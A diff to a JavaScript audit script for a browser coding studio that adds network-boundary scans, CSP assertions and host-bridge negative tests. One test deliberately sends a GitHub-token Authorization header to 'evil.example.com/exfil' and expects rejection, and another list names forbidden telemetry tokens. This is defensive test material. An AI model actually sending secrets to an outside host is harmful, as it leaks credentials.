@@ -12,7 +12,8 @@
  * - Suite 6: Deep Empirical Audit of Cmd+K Unified Diff Invocation & State
  */
 
-import { readFileSync, readdirSync, statSync } from 'node:fs';
+import { readFileSync, readdirSync, statSync, existsSync } from 'node:fs';
+import { createServer } from 'node:http';
 import { resolve, dirname } from 'node:path';
 import { fileURLToPath } from 'node:url';
 import { createHash } from 'node:crypto';
@@ -87,40 +88,53 @@ const genCoreSha = sha256(readFileSync(genCorePath));
 assert.equal(provenance.generated_core_sha256, genCoreSha, 'provenance.json generated_core_sha256 does not match lexlean_generated.rs');
 console.log('  ✓ 1.3 Provenance.json cryptographic SHA-256 bindings verified against disk.');
 
-// Forbidden telemetry / network string scan across text files
+// Forbidden telemetry / unencrypted remote transport scan across text files (R4-39)
 const textFiles = ['app.css', 'app.js', 'index.html', 'lexlean_r4.js', 'provenance.json'];
-const forbiddenTokens = [
-  'http://',
-  'https://',
+const universalForbiddenTokens = [
   'ftp://',
-  'ws://',
-  'wss://',
   'XMLHttpRequest',
   'EventSource',
   'navigator.sendBeacon',
   'google-analytics',
   'segment.io',
   'mixpanel',
-  'sentry.io'
+  'sentry.io',
+  'analytics',
+  'telemetry'
 ];
 
 for (const tf of textFiles) {
   const content = readFileSync(resolve(PUBLIC_DIR, tf), 'utf8');
-  for (const token of forbiddenTokens) {
+  for (const token of universalForbiddenTokens) {
     if (content.includes(token)) {
       recordDefect('DEFECT-NET-01', `Forbidden external token "${token}" found in public/${tf}`, 'CRITICAL', `Found token at index ${content.indexOf(token)}`);
     }
   }
+  const nonLoopbackHttp = content.match(/http:\/\/(?!127\.0\.0\.1)/);
+  if (nonLoopbackHttp) {
+    recordDefect('DEFECT-NET-02', `Non-loopback unencrypted http:// found in public/${tf}`, 'CRITICAL', `Index ${nonLoopbackHttp.index}`);
+  }
+  const nonLoopbackWs = content.match(/(?<!s)ws:\/\/(?!127\.0\.0\.1)/);
+  if (nonLoopbackWs) {
+    recordDefect('DEFECT-NET-03', `Non-loopback unencrypted ws:// found in public/${tf}`, 'CRITICAL', `Index ${nonLoopbackWs.index}`);
+  }
+  if (tf !== 'lexlean_r4.js') {
+    for (const bridgeOnly of ['https://', 'wss://', 'WebSocket', 'fetch(']) {
+      if (content.includes(bridgeOnly)) {
+        recordDefect('DEFECT-NET-04', `Network transport "${bridgeOnly}" leaked outside lexlean_r4.js into public/${tf}`, 'CRITICAL', `Index ${content.indexOf(bridgeOnly)}`);
+      }
+    }
+  }
 }
-console.log('  ✓ 1.4 Forbidden network and telemetry tokens scan passed with zero findings.');
+console.log('  ✓ 1.4 R4-39 TLS/loopback host-bridge boundary and zero-telemetry scan passed with zero findings.');
 
-// CSP Header Verification
+// CSP Header Verification (R4-39)
 const rawHtml = readFileSync(resolve(PUBLIC_DIR, 'index.html'), 'utf8');
 const cspMatch = rawHtml.match(/<meta\s+http-equiv=["']Content-Security-Policy["']\s+content="([^"]*)"/i);
 assert.ok(cspMatch, 'Content-Security-Policy meta tag must exist in index.html');
 const csp = cspMatch[1];
 assert.ok(csp.includes("default-src 'none'"), 'CSP must mandate default-src none');
-assert.ok(csp.includes("connect-src 'self'"), 'CSP must mandate connect-src self');
+assert.ok(csp.includes("connect-src 'self' https: wss: http://127.0.0.1:* ws://127.0.0.1:*"), 'CSP must mandate R4-39 connect-src TLS + loopback');
 assert.ok(csp.includes("script-src 'self' 'wasm-unsafe-eval'"), 'CSP must mandate wasm-unsafe-eval');
 assert.ok(!csp.includes("'unsafe-inline'"), 'CSP must not allow unsafe-inline scripts');
 console.log('  ✓ 1.5 Strict Content-Security-Policy verified.');
@@ -449,21 +463,19 @@ assert.ok(canonicalDiff.includes('+++ b/src/foo.rs'), 'Canonical diff header mus
 assert.ok(canonicalDiff.includes('-    1'), 'Canonical diff must show deletion');
 assert.ok(canonicalDiff.includes('+    2'), 'Canonical diff must show addition');
 
-// Now check line 9460 call pattern in app.js:
-// const diffText = computeUnifiedDiffJs(targetPath, originalCode, proposedFullCode);
-const targetPath = 'src/foo.rs';
-const invertedDiff = computeUnifiedDiffJs(targetPath, oldCode, newCode);
+// Verify app.js uses the canonical (originalCode, proposedFullCode, targetPath) call order
+const hasCanonicalCmdKCall = rawAppJs.includes('computeUnifiedDiffJs(originalCode, proposedFullCode, targetPath)');
+const hasInvertedCmdKCall = rawAppJs.includes('computeUnifiedDiffJs(targetPath, originalCode, proposedFullCode)');
 
-console.log('  Testing inverted call pattern from app.js line 9460:');
+console.log('  Checking computeUnifiedDiffJs call pattern in app.js:');
 console.log('  Canonical output headers:', canonicalDiff.split('\n').slice(0, 2).join(' | '));
-console.log('  Inverted output headers: ', invertedDiff.split('\n').slice(0, 2).join(' | '));
 
-if (invertedDiff.includes('--- a/' + newCode) || !invertedDiff.includes('--- a/src/foo.rs')) {
+if (hasInvertedCmdKCall || !hasCanonicalCmdKCall) {
   recordDefect(
     'DEFECT-CMDK-01',
-    'computeUnifiedDiffJs argument order inverted at app.js line 9460',
+    'computeUnifiedDiffJs argument order inverted in app.js',
     'HIGH',
-    'app.js line 9460 passes (targetPath, originalCode, proposedFullCode) to computeUnifiedDiffJs(oldText, newText, targetPath), corrupting diff headers and comparing file path string against original code.'
+    'app.js passes (targetPath, originalCode, proposedFullCode) instead of (originalCode, proposedFullCode, targetPath).'
   );
 } else {
   console.log('  ✓ computeUnifiedDiffJs call pattern is valid.');
@@ -477,6 +489,164 @@ console.log(`  cursor-act-explorer in index.html: ${explorerBtnInHtml}`);
 console.log(`  activity-btn-explorer in index.html: ${explorerAltInHtml}`);
 assert.ok(explorerBtnInHtml && explorerAltInHtml, 'index.html must have both primary and alias IDs');
 console.log('  ✓ Activity Bar dual-ID support confirmed in both index.html and app.js.');
+
+// ============================================================================
+// SUITE 7: R4-36..R4-40 CONNECTED CHAT-FIRST STUDIO & HOST-BRIDGE INVARIANTS
+// ============================================================================
+console.log('\n--- Suite 7: R4-36..R4-40 Connected Chat-First Studio & HostBridge Invariants ---');
+assert.ok(rawHtml.includes('data-layout-mode="chat"'), 'Default body layout mode must be chat');
+assert.ok(rawHtml.includes('id="toggle-studio-ide-btn"'), 'Must include #toggle-studio-ide-btn');
+assert.ok(rawHtml.includes('id="toggle-web-access-btn"'), 'Must include #toggle-web-access-btn');
+assert.ok(rawHtml.includes('id="open-github-connect-btn"'), 'Must include #open-github-connect-btn');
+assert.ok(rawHtml.includes('id="toggle-inspectors-btn"'), 'Must include #toggle-inspectors-btn');
+assert.ok(rawHtml.includes('id="inspectors-modal"'), 'Must include #inspectors-modal');
+assert.ok(rawHtml.includes('id="github-connect-modal"'), 'Must include #github-connect-modal');
+
+const inspectorsModalIdx = rawHtml.indexOf('id="inspectors-modal"');
+for (const panelId of [
+  'canvas-panel-traces',
+  'canvas-panel-inspector',
+  'canvas-panel-diff',
+  'canvas-panel-diagnostics',
+  'canvas-panel-mcp',
+  'canvas-panel-feed',
+  'canvas-panel-consolidation',
+  'canvas-panel-customizations',
+]) {
+  assert.ok(rawHtml.indexOf(`id="${panelId}"`) > inspectorsModalIdx, `${panelId} must reside inside #inspectors-modal`);
+}
+console.log('  ✓ 7.1 Chat-First landing, Studio IDE toggle, and full-height #inspectors-modal layout verified.');
+
+const rawLexleanJs = readFileSync(resolve(PUBLIC_DIR, 'lexlean_r4.js'), 'utf8');
+assert.ok(rawAppJs.includes("name: 'uor-r4-engine-worker'"), 'app.js must spawn uor-r4-engine-worker');
+assert.ok(rawAppJs.includes('ingestBrainPulse('), 'app.js must connect brain_pulse frames to 3D Brain');
+assert.ok(rawAppJs.includes('callosumPulsePackets'), 'app.js must animate Corpus Callosum arc packets');
+assert.ok(rawLexleanJs.includes('export class SpiralCoreHostBridge'), 'lexlean_r4.js must export SpiralCoreHostBridge');
+assert.ok(
+  rawLexleanJs.includes('wss://lexlean-r4-spiralcore-relay.swarm-relay-cloud-8d31a122.workers.dev/spvs'),
+  'lexlean_r4.js must integrate live Cloudflare Edge SpiralCore WSS relay'
+);
+
+const {
+  SpiralCoreHostBridge,
+  initSync,
+  studio_dispatch,
+  studio_load_uorgllm_v9_bytes,
+} = await import(new URL('../../public/lexlean_r4.js', import.meta.url));
+const bridge = new SpiralCoreHostBridge();
+const plainRej = await bridge.execute({ op: 'http_request', url: 'http://example.com/' });
+assert.equal(plainRej.ok, false);
+assert.equal(plainRej.error_code, 'InsecureTransportRejected');
+
+bridge.setSecret('GITHUB_TOKEN', 'ghp_test_token_never_leak');
+const hostRej = await bridge.execute({
+  op: 'http_request',
+  url: 'https://evil.example.com/exfil',
+  headers: { Authorization: 'Bearer {{MVM_SECRET:GITHUB_TOKEN}}' },
+});
+assert.equal(hostRej.ok, false);
+assert.equal(hostRej.error_code, 'HostNotAllowlistedForSecret');
+
+bridge.setPolicy({ mcpPolicy: 'deny' });
+const polRej = await bridge.execute({ op: 'dns_query', name: 'github.com' });
+assert.equal(polRej.ok, false);
+assert.equal(polRej.error_code, 'PolicyDenied');
+
+const badElf = new Uint8Array(64);
+badElf.set([0x7f, 0x45, 0x4c, 0x46, 2, 1, 1, 0]);
+badElf[18] = 62; // EM_X86_64 instead of EM_RISCV (243)
+const badElfSha = createHash('sha256').update(badElf).digest('hex');
+const elfRej = await bridge.verifyElf64RiscvAndSha256(badElf, badElfSha);
+assert.equal(elfRej.ok, false);
+assert.equal(elfRej.error_code, 'InvalidElf64Riscv');
+
+const validElf = new Uint8Array(badElf);
+validElf[18] = 243;
+const shaRej = await bridge.verifyElf64RiscvAndSha256(validElf, '0'.repeat(64));
+assert.equal(shaRej.ok, false);
+assert.equal(shaRej.error_code, 'DigestMismatch');
+bridge.close();
+console.log('  ✓ 7.2 R4-39 SpiralCoreHostBridge negative R5 verdicts (InsecureTransportRejected, HostNotAllowlistedForSecret, PolicyDenied, InvalidElf64Riscv, DigestMismatch) verified.');
+
+// 7.3 Live Static Server (/weights/... -> gpu/weights/...) + Real Wasm <15MB + pkg install jq + chat_v10_turn
+const wasmBytes = readFileSync(resolve(PUBLIC_DIR, 'lexlean_r4_bg.wasm'));
+assert.ok(wasmBytes.byteLength < 15 * 1024 * 1024, `lexlean_r4_bg.wasm must be < 15 MiB (got ${wasmBytes.byteLength} B)`);
+initSync({ module: wasmBytes });
+
+const staticServer = createServer((req, res) => {
+  const urlPath = decodeURIComponent((req.url || '/').split('?')[0]);
+  const fsTarget = urlPath.startsWith('/weights/')
+    ? resolve(REPO_ROOT, 'gpu', urlPath.slice(1))
+    : resolve(PUBLIC_DIR, urlPath === '/' ? 'index.html' : urlPath.slice(1));
+  if (!existsSync(fsTarget) || !statSync(fsTarget).isFile()) {
+    res.writeHead(404);
+    res.end('Not Found');
+    return;
+  }
+  const body = readFileSync(fsTarget);
+  const ct = fsTarget.endsWith('.json')
+    ? 'application/json'
+    : fsTarget.endsWith('.wasm')
+      ? 'application/wasm'
+      : 'application/octet-stream';
+  res.writeHead(200, { 'Content-Type': ct });
+  res.end(body);
+});
+
+await new Promise((resolveListen) => staticServer.listen(0, '127.0.0.1', resolveListen));
+const srvAddr = staticServer.address();
+const staticOrigin = `http://127.0.0.1:${srvAddr.port}`;
+try {
+  // Verify /weights/v10/manifest.json routes cleanly to gpu/weights/v10/manifest.json
+  const v10ManifestResp = await fetch(`${staticOrigin}/weights/v10/manifest.json`);
+  assert.equal(v10ManifestResp.status, 200, 'Static server must map /weights/v10/manifest.json -> gpu/weights/v10/manifest.json');
+  const v10Manifest = await v10ManifestResp.json();
+  assert.equal(v10Manifest.format, 'UORGLLM9');
+  const fullV10 = new Uint8Array(v10Manifest.total_bytes);
+  for (const s of v10Manifest.shards) {
+    const sResp = await fetch(`${staticOrigin}/weights/v10/${s.file}`);
+    assert.equal(sResp.status, 200);
+    const sBytes = new Uint8Array(await sResp.arrayBuffer());
+    fullV10.set(sBytes, s.byte_offset);
+  }
+  const loadedV10 = JSON.parse(studio_load_uorgllm_v9_bytes(fullV10, 'e2e_static_weights_v10'));
+  assert.equal(loadedV10.status, 'ok');
+  assert.equal(loadedV10.n_layers, 8);
+  assert.equal(loadedV10.d_model, 128);
+
+  // Verify chat_v10_turn returns ok + brain_pulses
+  const chatTurn = JSON.parse(studio_dispatch('1\tstudio\tchat_v10_turn\thi'));
+  assert.equal(chatTurn.status, 'ok');
+  assert.ok(Array.isArray(chatTurn.brain_pulses) && chatTurn.brain_pulses.length > 0, 'chat_v10_turn must emit brain_pulses');
+
+  // Verify pkg install jq fetches /weights/mvm-pkgs/ ELF64 (EM_RISCV=243 + SHA-256) and installs /usr/local/bin/jq
+  const localBridge = new SpiralCoreHostBridge({ staticOrigin });
+  const pkgStep1 = JSON.parse(studio_dispatch('1\tstudio\tmvm_exec\tpkg install jq'));
+  assert.equal(pkgStep1.status, 'needs_bridge');
+  const pkgBridgeResp = await localBridge.execute(pkgStep1.bridge_req);
+  assert.equal(pkgBridgeResp.ok, true);
+  assert.equal(pkgBridgeResp.elf_machine, 243);
+  const pkgStep2 = JSON.parse(
+    studio_dispatch(
+      `1\tstudio\tmvm_complete_bridge\t${JSON.stringify({
+        resume_state: pkgStep1.resume_state,
+        bridge_resp: pkgBridgeResp,
+      })}`,
+    ),
+  );
+  assert.equal(pkgStep2.status, 'ok');
+  assert.equal(pkgStep2.exit_code, 0);
+  assert.ok(String(pkgStep2.mvm_stdout || '').includes('/usr/local/bin/jq'));
+
+  const jqPipeRes = JSON.parse(studio_dispatch('1\tstudio\tmvm_exec\techo \'{"n":42}\' | jq .n'));
+  assert.equal(jqPipeRes.status, 'ok');
+  assert.equal(jqPipeRes.exit_code, 0);
+  assert.equal(String(jqPipeRes.mvm_stdout || '').trim(), '42');
+  localBridge.close();
+  console.log('  ✓ 7.3 Static /weights/ mapping, <15 MiB Wasm v10 8L 128D hydration, chat_v10_turn brain_pulses, and RV64IMAC pkg install jq + pipe verified.');
+} finally {
+  await new Promise((resolveClose) => staticServer.close(resolveClose));
+}
 
 // ============================================================================
 // SUMMARY & VERDICT
